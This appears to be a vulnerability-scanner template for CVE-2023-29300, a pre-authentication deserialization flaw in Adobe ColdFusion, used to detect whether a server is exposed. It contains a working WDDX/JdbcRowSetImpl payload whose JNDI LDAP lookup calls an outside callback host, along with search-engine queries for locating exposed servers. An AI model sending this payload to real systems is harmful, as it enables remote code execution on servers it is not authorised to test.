http:
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "dns")
    - contains(body, "ColdFusion documentation")
    type: dsl
  raw:
  - 'POST ///CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    argumentCollection=<wddxPacket+version%3d''1.0''><header/><data><struct+type%3d''xcom.sun.rowset.JdbcRowSetImplx''><var+name%3d''dataSourceName''><string>{{jndi}}</string></var><var+name%3d''autoCommit''><boolean+value%3d''true''/></var></struct></data></wddxPacket>

    '
id: CVE-2023-29300
info:
  author: rootxharsh,iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:adobe:coldfusion:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-29300
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.99846
    epss-score: 0.93799
  description: 'Adobe ColdFusion versions 2018u16 (and earlier), 2021u6 (and earlier)
    and 2023.0.0.330468 (and earlier) are affected by a Deserialization of Untrusted
    Data vulnerability that could result in Arbitrary code execution. Exploitation
    of this issue does not require user interaction.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    fofa-query:
    - app="Adobe-ColdFusion"
    - app="adobe-coldfusion"
    - title="coldfusion administrator login"
    google-query: intitle:"coldfusion administrator login"
    max-request: 1
    product: coldfusion
    shodan-query:
    - http.component:"Adobe ColdFusion"
    - http.component:"adobe coldfusion"
    - http.title:"coldfusion administrator login"
    - cpe:"cpe:2.3:a:adobe:coldfusion"
    vendor: adobe
  name: Adobe ColdFusion - Pre-Auth Remote Code Execution
  reference:
  - https://blog.projectdiscovery.io/adobe-coldfusion-rce/
  - https://helpx.adobe.com/security/products/coldfusion/apsb23-40.html
  - https://github.com/Ostorlab/KEV
  - https://github.com/Threekiii/Vulhub-Reproduce
  - https://github.com/XRSec/AWVS-Update
  remediation: 'Upgrade to Adobe ColdFusion version 2023.0.0.328155 or later to mitigate
    this vulnerability.

    '
  severity: critical
  tags: cve,cve2023,adobe,rce,coldfusion,deserialization,kev,vkev,vuln
variables:
  callback: '{{interactsh-url}}'
  jndi: ldap%3a//{{callback}}/rcrzfd
